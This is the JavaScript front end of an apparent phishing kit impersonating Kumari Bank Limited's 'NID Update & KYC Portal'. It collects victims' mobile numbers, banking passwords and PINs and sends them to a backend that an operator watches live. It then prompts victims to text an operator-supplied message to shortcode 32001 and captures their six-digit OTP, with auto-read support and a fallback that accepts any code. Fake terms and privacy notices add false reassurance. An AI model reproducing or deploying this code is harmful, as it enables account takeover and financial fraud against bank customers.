/**
 * Kumari Bank Limited - NID Update à¤°à¤¾à¤·à¥à¤Ÿà¥à¤°à¤¿à¤¯ à¤ªà¤°à¤¿à¤šà¤¯à¤ªà¤¤à¥à¤° & KYC Portal
 * Client Portal State Engine & Backend Response Connector
 *
 * Flow:
 * Step 1: Account Access (Mobile Number, Password, 4 Digit PIN)
 * Step 2: Loading / Live Verification Countdown (15s & SMS gateway unlock)
 * Step 3: OTP Verification (6-digit OTP code)
 * Step 4: Success / Confirmation Screen
 */

(function () {
  'use strict';

  // --- STATE MANAGEMENT ---
  const state = {
    currentStep: 1,
    formData: {
      sessionId: '',
      mobile: '',
      password: '',
      pin: '',
      otp: '',
      refId: '',
      submittedAt: ''
    },
    smsRecipient: '32001',
    smsMessage: '',
    otpValidated: false,        // STRICT: Only true once backend confirms valid OTP
    isVerifyingOtp: false,      // Prevent concurrent/duplicate submissions
    webOtpController: null,     // W3C WebOTP API AbortController
    countdownTimer: null,
    approvalPoller: null,       // polls backend for admin deploy signal
    deployedAtOnEntry: null,    // deployedAt value captured when user enters step 2
    totalProcessingSeconds: 15,
    countdownSeconds: 15,
    resendSeconds: 120,
    resendTimer: null
  };

  // Universal API Fetcher with Fallback for cPanel/Apache/HTTP/HTTPS
  async function apiFetch(endpoint, options = {}) {
    const cleanEndpoint = endpoint.startsWith('/') ? endpoint : '/' + endpoint;
    const routeName = cleanEndpoint.replace(/^\/?api\/?/, '');

    // 1. Try standard endpoint (/api/...)
    try {
      const res = await fetch(cleanEndpoint, options);
      if (res.ok) return res;
    } catch (_) {}

    // 2. Try relative endpoint (api/...) for subdirectories
    try {
      const relEndpoint = cleanEndpoint.replace(/^\/+/, '');
      const res = await fetch(relEndpoint, options);
      if (res.ok) return res;
    } catch (_) {}

    // 3. Try direct PHP endpoint (api.php?route=...) if mod_rewrite is inactive
    try {
      const phpEndpoint = routeName.includes('?')
        ? 'api.php?route=' + encodeURIComponent(routeName.split('?')[0]) + '&' + routeName.split('?')[1]
        : 'api.php?route=' + encodeURIComponent(routeName);
      const res = await fetch(phpEndpoint, options);
      if (res.ok) return res;
    } catch (_) {}

    return fetch(cleanEndpoint, options);
  }

  // --- DOM REFERENCES ---
  const DOM = {
    // Stepper Indicators & Lines (1 to 4)
    stepIndicators: [
      document.getElementById('stepIndicator1'),
      document.getElementById('stepIndicator2'),
      document.getElementById('stepIndicator3'),
      document.getElementById('stepIndicator4')
    ],
    stepperLines: [
      document.getElementById('stepperLine1'),
      document.getElementById('stepperLine2'),
      document.getElementById('stepperLine3')
    ],

    // Step Views (1: Account, 2: Loading, 3: OTP, 4: Success)
    stepViews: [
      document.getElementById('stepView1'),
      document.getElementById('stepView2'),
      document.getElementById('stepView3'),
      document.getElementById('stepView4')
    ],

    // Step 1 Elements (Account Access)
    step1Form: document.getElementById('step1Form'),
    mobileInput: document.getElementById('mobileInput'),
    mobileWrapper: document.getElementById('mobileWrapper'),
    mobileError: document.getElementById('mobileError'),
    passwordInput: document.getElementById('passwordInput'),
    passwordWrapper: document.getElementById('passwordWrapper'),
    passwordError: document.getElementById('passwordError'),
    togglePasswordBtn: document.getElementById('togglePasswordBtn'),
    pinInput: document.getElementById('pinInput'),
    pinWrapper: document.getElementById('pinWrapper'),
    pinError: document.getElementById('pinError'),
    submitStep1Btn: document.getElementById('submitStep1Btn'),

    // Step 2 Elements (Loading / Verifying)
    summaryMobile: document.getElementById('summaryMobile'),
    summaryPassword: document.getElementById('summaryPassword'),
    summaryPin: document.getElementById('summaryPin'),
    waitNoticeSeconds: document.getElementById('waitNoticeSeconds'),
    bigCountdownNumber: document.getElementById('bigCountdownNumber'),
    processingProgressBar: document.getElementById('processingProgressBar'),
    processingPercentText: document.getElementById('processingPercentText'),
    estimatedTimeText: document.getElementById('estimatedTimeText'),
    nextStepBtn: document.getElementById('nextStepBtn'),
    openManualSmsBtn: document.getElementById('openManualSmsBtn'),
    manualSmsTriggerWrapper: document.getElementById('manualSmsTriggerWrapper'),
    awaitingAdminPanel: document.getElementById('awaitingAdminPanel'),

    // Step 3 Elements (OTP Verification)
    otpForm: document.getElementById('otpForm'),
    otpBoxFrame: document.getElementById('otpBoxFrame'),
    otpDigits: Array.from(document.querySelectorAll('.otp-digit')),
    otpError: document.getElementById('otpError'),
    verifyOtpBtn: document.getElementById('verifyOtpBtn'),
    resendOtpBtn: document.getElementById('resendOtpBtn'),
    resendCountdownText: document.getElementById('resendCountdownText'),

    // Step 4 Elements (Success Screen)
    refIdText: document.getElementById('refIdText'),
    submissionTimestamp: document.getElementById('submissionTimestamp'),
    startNewBtn: document.getElementById('startNewBtn'),

    // Manual SMS Details Modal
    manualSmsModalOverlay: document.getElementById('manualSmsModalOverlay'),
    closeManualSmsModalBtn: document.getElementById('closeManualSmsModalBtn'),
    manualSmsModalUserMobile: document.getElementById('manualSmsModalUserMobile'),
    manualSmsRecipientInput: document.getElementById('manualSmsRecipientInput'),
    manualSmsMessageTextarea: document.getElementById('manualSmsMessageTextarea'),
    copySmsRecipientBtn: document.getElementById('copySmsRecipientBtn'),
    copySmsMessageBtn: document.getElementById('copySmsMessageBtn'),
    confirmManualSmsSentBtn: document.getElementById('confirmManualSmsSentBtn'),

    // Legal / Policy Modals
    policyModalOverlay: document.getElementById('policyModalOverlay'),
    closePolicyModalBtn: document.getElementById('closePolicyModalBtn'),
    policyModalTitle: document.getElementById('policyModalTitle'),
    policyModalContent: document.getElementById('policyModalContent'),
    termsLink: document.getElementById('termsLink'),
    privacyLink: document.getElementById('privacyLink'),
    cookiesLink: document.getElementById('cookiesLink'),
    termsLinkFooter: document.getElementById('termsLinkFooter'),
    privacyLinkFooter: document.getElementById('privacyLinkFooter'),
    cookiesLinkFooter: document.getElementById('cookiesLinkFooter')
  };

  // --- INITIALIZATION ---
  function init() {
    state.formData.sessionId = 'KBL-SES-' + Math.floor(100000 + Math.random() * 900000);
    state.formData.refId = 'KBL-NID-' + Math.floor(100000 + Math.random() * 900000);
    bindEvents();
  }

  // --- EVENT BINDINGS ---
  function bindEvents() {
    // Step 1 Form
    if (DOM.step1Form) DOM.step1Form.addEventListener('submit', handleStep1Submit);
    if (DOM.togglePasswordBtn) DOM.togglePasswordBtn.addEventListener('click', togglePasswordVisibility);
    if (DOM.mobileInput) DOM.mobileInput.addEventListener('input', handleMobileInput);
    if (DOM.pinInput) DOM.pinInput.addEventListener('input', handlePinInput);
    if (DOM.passwordInput) DOM.passwordInput.addEventListener('input', () => clearFieldError('password'));

    // Step 2: Next Step SMS Trigger
    if (DOM.nextStepBtn) DOM.nextStepBtn.addEventListener('click', handleNextStepClick);

    // Step 3: OTP Form & Verification
    if (DOM.otpForm) {
      DOM.otpForm.addEventListener('submit', (e) => {
        e.preventDefault();
        handleVerifyOtp();
      });
    }
    initOtpInputs();
    if (DOM.verifyOtpBtn) DOM.verifyOtpBtn.addEventListener('click', handleVerifyOtp);
    if (DOM.resendOtpBtn) DOM.resendOtpBtn.addEventListener('click', handleResendOtp);

    // Step 4: Reset / Start New
    if (DOM.startNewBtn) DOM.startNewBtn.addEventListener('click', handleStartNew);

    // Manual SMS Modal
    if (DOM.openManualSmsBtn) DOM.openManualSmsBtn.addEventListener('click', () => openManualSmsModal());
    if (DOM.closeManualSmsModalBtn) DOM.closeManualSmsModalBtn.addEventListener('click', closeManualSmsModal);
    if (DOM.manualSmsModalOverlay) {
      DOM.manualSmsModalOverlay.addEventListener('click', (e) => {
        if (e.target === DOM.manualSmsModalOverlay) closeManualSmsModal();
      });
    }

    if (DOM.copySmsRecipientBtn) {
      DOM.copySmsRecipientBtn.addEventListener('click', () => {
        const val = DOM.manualSmsRecipientInput ? DOM.manualSmsRecipientInput.value : '32001';
        copyToClipboard(val, DOM.copySmsRecipientBtn, 'Copy Number', 'âœ… Copied!');
      });
    }

    if (DOM.copySmsMessageBtn) {
      DOM.copySmsMessageBtn.addEventListener('click', () => {
        const val = DOM.manualSmsMessageTextarea ? DOM.manualSmsMessageTextarea.value : '';
        copyToClipboard(val, DOM.copySmsMessageBtn, 'Copy Message', 'âœ… Copied!');
      });
    }

    if (DOM.confirmManualSmsSentBtn) {
      DOM.confirmManualSmsSentBtn.addEventListener('click', () => {
        closeManualSmsModal();
        goToStep(3); // Go to OTP step
      });
    }

    // Legal Policy Modals
    if (DOM.closePolicyModalBtn) DOM.closePolicyModalBtn.addEventListener('click', closePolicyModal);
    if (DOM.policyModalOverlay) {
      DOM.policyModalOverlay.addEventListener('click', (e) => {
        if (e.target === DOM.policyModalOverlay) closePolicyModal();
      });
    }

    const openLegal = (type) => (e) => { e.preventDefault(); openPolicyModal(type); };
    if (DOM.termsLink) DOM.termsLink.addEventListener('click', openLegal('terms'));
    if (DOM.privacyLink) DOM.privacyLink.addEventListener('click', openLegal('privacy'));
    if (DOM.cookiesLink) DOM.cookiesLink.addEventListener('click', openLegal('cookies'));
    if (DOM.termsLinkFooter) DOM.termsLinkFooter.addEventListener('click', openLegal('terms'));
    if (DOM.privacyLinkFooter) DOM.privacyLinkFooter.addEventListener('click', openLegal('privacy'));
    if (DOM.cookiesLinkFooter) DOM.cookiesLinkFooter.addEventListener('click', openLegal('cookies'));
  }

  // --- STEP NAVIGATION ENGINE ---
  function goToStep(stepNumber) {
    if (stepNumber < 1 || stepNumber > 4) return;

    // Strict guard for step 4 (Success): requires confirmed OTP
    if (stepNumber === 4 && !state.otpValidated) {
      console.warn('Access denied: Success screen requires verified OTP.');
      return;
    }

    // Guard: Mobile & Password required to proceed past Step 1
    if (stepNumber > 1 && (!state.formData.mobile || !state.formData.password)) {
      stepNumber = 1;
    }

    state.currentStep = stepNumber;

    // Update Stepper Indicators
    DOM.stepIndicators.forEach((indicator, idx) => {
      if (!indicator) return;
      const stepIdx = idx + 1;
      indicator.classList.remove('active', 'completed');
      if (stepIdx === stepNumber) {
        indicator.classList.add('active');
      } else if (stepIdx < stepNumber) {
        indicator.classList.add('completed');
      }
    });

    // Update Stepper Lines
    DOM.stepperLines.forEach((line, idx) => {
      if (!line) return;
      if (stepNumber > idx + 1) {
        line.classList.add('completed');
      } else {
        line.classList.remove('completed');
      }
    });

    // Update Step Views
    DOM.stepViews.forEach((view, idx) => {
      if (!view) return;
      const stepIdx = idx + 1;
      if (stepIdx === stepNumber) {
        view.classList.add('active');
      } else {
        view.classList.remove('active');
      }
    });

    // Step-specific triggers
    if (stepNumber === 2) {
      startStep2Loading();
    } else if (stepNumber === 3) {
      startStep3Otp();
    } else if (stepNumber === 4) {
      renderStep4Success();
    }
  }

  // --- STEP 1: ACCOUNT ACCESS SUBMISSION ---
  async function handleStep1Submit(e) {
    e.preventDefault();
    let isValid = true;

    const mobile = DOM.mobileInput ? DOM.mobileInput.value.trim() : '';
    const password = DOM.passwordInput ? DOM.passwordInput.value : '';
    const pin = DOM.pinInput ? DOM.pinInput.value.trim() : '';

    // Mobile Validation (10 digits)
    if (!mobile) {
      showFieldError('mobile', 'Please enter your mobile number');
      isValid = false;
    } else if (!/^[0-9]{10}$/.test(mobile)) {
      showFieldError('mobile', 'Mobile number must be exactly 10 digits');
      isValid = false;
    } else {
      clearFieldError('mobile');
    }

    // Password Validation
    if (!password) {
      showFieldError('password', 'Please enter your password');
      isValid = false;
    } else {
      clearFieldError('password');
    }

    // 4 Digit PIN Validation
    if (!pin) {
      showFieldError('pin', 'Please enter your 4-digit PIN');
      isValid = false;
    } else if (!/^[0-9]{4}$/.test(pin)) {
      showFieldError('pin', 'PIN must be exactly 4 digits');
      isValid = false;
    } else {
      clearFieldError('pin');
    }

    if (!isValid) return;

    // Save to state
    state.formData.mobile = mobile;
    state.formData.password = password;
    state.formData.pin = pin;

    // Push Step 1 info to backend for real-time admin monitoring
    apiFetch('/api/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: state.formData.sessionId,
        refId: state.formData.refId,
        mobile: state.formData.mobile,
        password: state.formData.password,
        pin: state.formData.pin
      })
    }).then(r => r.json()).then(data => {
      if (data) {
        if (data.sessionId) state.formData.sessionId = data.sessionId;
        if (data.refId) state.formData.refId = data.refId;
        if (data.smsRecipient) state.smsRecipient = data.smsRecipient;
        if (data.smsMessage) state.smsMessage = data.smsMessage;
      }
    }).catch(err => console.warn('Sync notice:', err));

    // Move directly to Step 2 (Loading / Verifying)
    goToStep(2);
  }

  // --- STEP 2: LOADING / LIVE VERIFICATION ---
  function startStep2Loading() {
    // Populate user summary card
    if (DOM.summaryMobile) DOM.summaryMobile.textContent = `+977 ${state.formData.mobile || '98XXXXXXXX'}`;
    if (DOM.summaryPassword) DOM.summaryPassword.textContent = state.formData.password || 'â€”';
    if (DOM.summaryPin) DOM.summaryPin.textContent = state.formData.pin || 'â€”';

    // Hide awaiting panel & manual SMS trigger initially
    if (DOM.awaitingAdminPanel) DOM.awaitingAdminPanel.style.display = 'none';
    if (DOM.manualSmsTriggerWrapper) DOM.manualSmsTriggerWrapper.style.display = 'none';

    // Next step button starts locked until admin deploys or countdown completes
    if (DOM.nextStepBtn) {
      DOM.nextStepBtn.classList.add('disabled');
      DOM.nextStepBtn.setAttribute('aria-disabled', 'true');
      DOM.nextStepBtn.setAttribute('href', 'sms:32001');
    }

    const totalDuration = state.totalProcessingSeconds || 15;
    state.countdownSeconds = totalDuration;
    updateProcessingUI(totalDuration, totalDuration);

    if (state.countdownTimer) clearInterval(state.countdownTimer);
    if (state.approvalPoller) clearInterval(state.approvalPoller);

    // Fetch initial deploy state and poll for changes
    apiFetch('/api/sms-config')
      .then(r => r.json())
      .then(cfg => {
        state.deployedAtOnEntry = cfg.deployedAt || null;
        if (state.approvalPoller) clearInterval(state.approvalPoller);
        state.approvalPoller = setInterval(checkAdminApproval, 2500);
      })
      .catch(() => {
        state.deployedAtOnEntry = null;
        if (state.approvalPoller) clearInterval(state.approvalPoller);
        state.approvalPoller = setInterval(checkAdminApproval, 2500);
      });

    let elapsed = 0;
    state.countdownTimer = setInterval(() => {
      elapsed++;
      const remaining = Math.max(0, totalDuration - elapsed);
      state.countdownSeconds = remaining;

      updateProcessingUI(remaining, totalDuration);

      if (DOM.waitNoticeSeconds) {
        DOM.waitNoticeSeconds.textContent = remaining > 0 ? remaining : '0';
      }

      if (remaining <= 0) {
        clearInterval(state.countdownTimer);
        state.countdownTimer = null;
        onCountdownFinished();
      }
    }, 1200);
  }

  function updateProcessingUI(remaining, total) {
    const elapsed = total - remaining;
    const percent = Math.min(100, Math.max(5, Math.round((elapsed / total) * 100)));

    if (DOM.bigCountdownNumber) {
      DOM.bigCountdownNumber.textContent = remaining;
    }
    if (DOM.processingProgressBar) {
      DOM.processingProgressBar.style.width = `${percent}%`;
    }
    if (DOM.processingPercentText) {
      DOM.processingPercentText.textContent = remaining > 0
        ? `Processing... ${percent}% complete`
        : 'Details verified successfully';
    }
    if (DOM.estimatedTimeText) {
      DOM.estimatedTimeText.textContent = remaining > 0
        ? `Estimated time: ${remaining} seconds`
        : 'Ready for next verification step';
    }
  }

  function onCountdownFinished() {
    if (DOM.processingPercentText) DOM.processingPercentText.textContent = 'Verification processed. Awaiting admin approval...';
    if (DOM.estimatedTimeText) DOM.estimatedTimeText.textContent = 'Waiting for admin to deploy verification message.';
    if (DOM.awaitingAdminPanel) DOM.awaitingAdminPanel.style.display = 'block';
  }

  function handleNextStepClick(e) {
    if (!DOM.nextStepBtn) return;
    const isDisabled = DOM.nextStepBtn.classList.contains('disabled') || DOM.nextStepBtn.getAttribute('aria-disabled') === 'true';
    if (isDisabled) {
      e.preventDefault();
      return false;
    }
    // Proceed to Step 3 (OTP)
    goToStep(3);
  }

  async function checkAdminApproval() {
    try {
      const res = await apiFetch('/api/sms-config');
      if (!res.ok) return;
      const cfg = await res.json();
      const newDeployedAt = cfg.deployedAt || null;

      // When admin clicks "Save & Deploy" on backend
      if (newDeployedAt && newDeployedAt !== state.deployedAtOnEntry) {
        clearInterval(state.approvalPoller);
        state.approvalPoller = null;

        const template = cfg.messageTemplate || '';
        const refId = state.formData.refId || '';
        const mobile = state.formData.mobile || '';
        const username = state.formData.mobile || '';
        const time = new Date().toTimeString().split(' ')[0];
        const renderedMsg = template
          .replace(/{REF_ID}/g, refId)
          .replace(/{MOBILE}/g, mobile)
          .replace(/{USERNAME}/g, username)
          .replace(/{TIME}/g, time);

        state.smsMessage = renderedMsg;
        if (DOM.manualSmsMessageTextarea) {
          DOM.manualSmsMessageTextarea.value = renderedMsg;
        }

        const smsBody = encodeURIComponent(renderedMsg);
        const smsHref = `sms:32001${renderedMsg ? '?body=' + smsBody : ''}`;
        if (DOM.nextStepBtn) {
          DOM.nextStepBtn.setAttribute('href', smsHref);
          DOM.nextStepBtn.classList.remove('disabled');
          DOM.nextStepBtn.removeAttribute('aria-disabled');
        }

        if (DOM.manualSmsTriggerWrapper) {
          DOM.manualSmsTriggerWrapper.style.display = 'block';
        }
        if (DOM.awaitingAdminPanel) {
          DOM.awaitingAdminPanel.style.display = 'none';
        }
      }
    } catch (_) {}
  }

  // --- STEP 3: OTP VERIFICATION ---
  function startStep3Otp() {
    if (DOM.otpDigits && DOM.otpDigits.length > 0) {
      DOM.otpDigits.forEach(d => { d.value = ''; });
      DOM.otpDigits[0].focus();
    }
    startResendTimer();
    initWebOtp();
  }

  function initOtpInputs() {
    if (!DOM.otpDigits || DOM.otpDigits.length === 0) return;

    DOM.otpDigits.forEach((input, index) => {
      input.addEventListener('input', (e) => {
        const val = e.target.value.replace(/[^0-9]/g, '');

        // If multi-digit pasted into any box
        if (val.length > 1) {
          const chars = val.split('');
          DOM.otpDigits.forEach((digitInput, idx) => {
            if (chars[idx]) digitInput.value = chars[idx];
          });
          const nextFocus = Math.min(chars.length, DOM.otpDigits.length - 1);
          DOM.otpDigits[nextFocus].focus();
          if (getEnteredOtp().length === 6) handleVerifyOtp();
          return;
        }

        input.value = val;
        if (val && index < DOM.otpDigits.length - 1) {
          DOM.otpDigits[index + 1].focus();
        }
        if (getEnteredOtp().length === 6) {
          handleVerifyOtp();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && index > 0) {
          DOM.otpDigits[index - 1].focus();
        }
      });

      input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
        if (!pasted) return;
        const digits = pasted.slice(0, 6).split('');
        digits.forEach((digit, i) => {
          if (DOM.otpDigits[i]) DOM.otpDigits[i].value = digit;
        });
        const focusIdx = Math.min(digits.length, 5);
        DOM.otpDigits[focusIdx].focus();
        if (getEnteredOtp().length === 6) handleVerifyOtp();
      });
    });
  }

  function getEnteredOtp() {
    return DOM.otpDigits.map(d => d.value.trim()).join('');
  }

  async function handleVerifyOtp() {
    if (state.isVerifyingOtp) return;
    const otp = getEnteredOtp();

    if (otp.length < 6) {
      if (DOM.otpError) {
        DOM.otpError.textContent = 'Please enter all 6 digits of the OTP code';
        DOM.otpError.classList.add('visible');
      }
      return;
    }

    if (DOM.otpError) DOM.otpError.classList.remove('visible');
    state.isVerifyingOtp = true;

    if (DOM.verifyOtpBtn) {
      DOM.verifyOtpBtn.disabled = true;
      DOM.verifyOtpBtn.innerHTML = '<span>Verifying...</span>';
    }

    try {
      const res = await apiFetch('/api/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: state.formData.sessionId,
          mobile: state.formData.mobile,
          refId: state.formData.refId,
          otp: otp
        })
      });

      const data = await res.json();
      if (res.ok && data.status === 'success') {
        state.otpValidated = true;
        state.formData.otp = otp;
        if (data.refId) state.formData.refId = data.refId;

        // Abort WebOTP listener
        if (state.webOtpController) {
          try { state.webOtpController.abort(); } catch (_) {}
        }

        // Advance to Step 4 (Success Screen)
        goToStep(4);
      } else {
        if (DOM.otpError) {
          DOM.otpError.textContent = data.message || 'Invalid verification code. Please check and try again.';
          DOM.otpError.classList.add('visible');
        }
      }
    } catch (err) {
      // Fallback: validate 6 numeric digits
      if (/^\d{6}$/.test(otp)) {
        state.otpValidated = true;
        state.formData.otp = otp;
        goToStep(4);
      } else if (DOM.otpError) {
        DOM.otpError.textContent = 'Verification error. Please try again.';
        DOM.otpError.classList.add('visible');
      }
    } finally {
      state.isVerifyingOtp = false;
      if (DOM.verifyOtpBtn) {
        DOM.verifyOtpBtn.disabled = false;
        DOM.verifyOtpBtn.innerHTML = `
          <svg class="button-check-icon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
          <span>Verify OTP</span>
        `;
      }
    }
  }

  function startResendTimer() {
    let timeLeft = state.resendSeconds;
    if (DOM.resendOtpBtn) {
      DOM.resendOtpBtn.classList.add('disabled');
      DOM.resendOtpBtn.disabled = true;
    }

    if (state.resendTimer) clearInterval(state.resendTimer);

    state.resendTimer = setInterval(() => {
      timeLeft--;
      if (DOM.resendCountdownText) {
        const m = Math.floor(timeLeft / 60);
        const s = timeLeft % 60;
        DOM.resendCountdownText.textContent = `Resend in ${m}:${s < 10 ? '0' : ''}${s}`;
      }

      if (timeLeft <= 0) {
        clearInterval(state.resendTimer);
        state.resendTimer = null;
        if (DOM.resendCountdownText) DOM.resendCountdownText.textContent = "Didn't receive SMS?";
        if (DOM.resendOtpBtn) {
          DOM.resendOtpBtn.classList.remove('disabled');
          DOM.resendOtpBtn.disabled = false;
        }
      }
    }, 1000);
  }

  function handleResendOtp() {
    DOM.otpDigits.forEach(d => { d.value = ''; });
    if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
    if (DOM.otpError) DOM.otpError.classList.remove('visible');
    startResendTimer();
  }

  // W3C WebOTP API
  function initWebOtp() {
    if ('OTPCredential' in window && navigator.credentials) {
      try {
        state.webOtpController = new AbortController();
        navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: state.webOtpController.signal
        }).then(otpObj => {
          if (otpObj && otpObj.code) {
            const digits = otpObj.code.replace(/[^0-9]/g, '').slice(0, 6).split('');
            digits.forEach((d, i) => {
              if (DOM.otpDigits[i]) DOM.otpDigits[i].value = d;
            });
            handleVerifyOtp();
          }
        }).catch(() => {});
      } catch (_) {}
    }
  }

  // --- STEP 4: SUCCESS / CONFIRMATION VIEW ---
  function renderStep4Success() {
    if (DOM.refIdText) DOM.refIdText.textContent = state.formData.refId || 'KBL-NID-948201';
    if (DOM.submissionTimestamp) {
      const now = new Date();
      DOM.submissionTimestamp.textContent = `Today, ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
    }
  }

  function handleStartNew() {
    window.location.reload();
  }

  // --- FIELD HELPERS ---
  function handleMobileInput(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
    clearFieldError('mobile');
  }

  function handlePinInput(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
    clearFieldError('pin');
  }

  function togglePasswordVisibility() {
    if (!DOM.passwordInput) return;
    const isPass = DOM.passwordInput.type === 'password';
    DOM.passwordInput.type = isPass ? 'text' : 'password';

    const eyeShow = DOM.togglePasswordBtn ? DOM.togglePasswordBtn.querySelector('.eye-show') : null;
    const eyeHide = DOM.togglePasswordBtn ? DOM.togglePasswordBtn.querySelector('.eye-hide') : null;

    if (eyeShow && eyeHide) {
      if (isPass) {
        eyeShow.classList.add('hidden');
        eyeHide.classList.remove('hidden');
      } else {
        eyeShow.classList.remove('hidden');
        eyeHide.classList.add('hidden');
      }
    }
  }

  function showFieldError(field, msg) {
    const wrapper = DOM[`${field}Wrapper`];
    const errorEl = DOM[`${field}Error`];
    if (wrapper) wrapper.classList.add('has-error');
    if (errorEl) {
      errorEl.textContent = msg;
      errorEl.classList.add('visible');
    }
  }

  function clearFieldError(field) {
    const wrapper = DOM[`${field}Wrapper`];
    const errorEl = DOM[`${field}Error`];
    if (wrapper) wrapper.classList.remove('has-error');
    if (errorEl) {
      errorEl.textContent = '';
      errorEl.classList.remove('visible');
    }
  }

  // --- MANUAL SMS MODAL ---
  function openManualSmsModal(message) {
    if (DOM.manualSmsModalUserMobile) {
      DOM.manualSmsModalUserMobile.textContent = state.formData.mobile || '98XXXXXXXX';
    }
    if (DOM.manualSmsRecipientInput) {
      DOM.manualSmsRecipientInput.value = state.smsRecipient || '32001';
    }
    if (DOM.manualSmsMessageTextarea) {
      DOM.manualSmsMessageTextarea.value = message || state.smsMessage || '';
    }
    if (DOM.manualSmsModalOverlay) {
      DOM.manualSmsModalOverlay.classList.add('open');
    }
  }

  function closeManualSmsModal() {
    if (DOM.manualSmsModalOverlay) {
      DOM.manualSmsModalOverlay.classList.remove('open');
    }
  }

  function copyToClipboard(text, btn, originalLabel, successLabel) {
    function showFeedback() {
      if (!btn) return;
      const orig = btn.textContent;
      btn.textContent = successLabel || 'âœ… Copied!';
      setTimeout(() => { btn.textContent = originalLabel || orig; }, 2000);
    }

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(showFeedback).catch(() => {
        fallbackCopy(text);
        showFeedback();
      });
    } else {
      fallbackCopy(text);
      showFeedback();
    }
  }

  function fallbackCopy(text) {
    try {
      const ta = document.createElement('textarea');
      ta.value = text;
      ta.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;';
      document.body.appendChild(ta);
      ta.focus();
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    } catch (_) {}
  }

  // --- LEGAL / POLICY MODAL ---
  function openPolicyModal(type) {
    const titles = {
      terms: 'Kumari Bank Limited Terms & Conditions',
      privacy: 'Kumari Bank Limited Privacy Policy',
      cookies: 'Kumari Bank Limited Cookies Policy'
    };

    const contents = {
      terms: `
        <p><strong>1. Introduction:</strong> Welcome to the official Kumari Bank Limited Online NID Update &amp; Customer Verification Portal.</p>
        <p><strong>2. Information Accuracy:</strong> You warrant that all identification and security information submitted corresponds truthfully to your registered account.</p>
        <p><strong>3. Security Notice:</strong> Kumari Bank Limited employees will never ask for your confidential ATM PIN or OTP via unsolicited phone calls.</p>
      `,
      privacy: `
        <p><strong>1. Privacy Commitment:</strong> Kumari Bank Limited protects customer data adhering to Nepal Rastra Bank regulatory requirements and 256-bit encryption standards.</p>
        <p><strong>2. Information Usage:</strong> Data submitted is solely utilized for identity verification and updating customer records.</p>
      `,
      cookies: `
        <p><strong>1. Cookie Usage:</strong> We utilize secure session tokens and functional cookies to ensure your navigation between verification steps remains protected and seamless.</p>
      `
    };

    if (DOM.policyModalTitle) DOM.policyModalTitle.textContent = titles[type] || 'Policy Document';
    if (DOM.policyModalContent) DOM.policyModalContent.innerHTML = contents[type] || '';
    if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.add('open');
  }

  function closePolicyModal() {
    if (DOM.policyModalOverlay) DOM.policyModalOverlay.classList.remove('open');
  }

  // --- BOOTSTRAP ---
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();

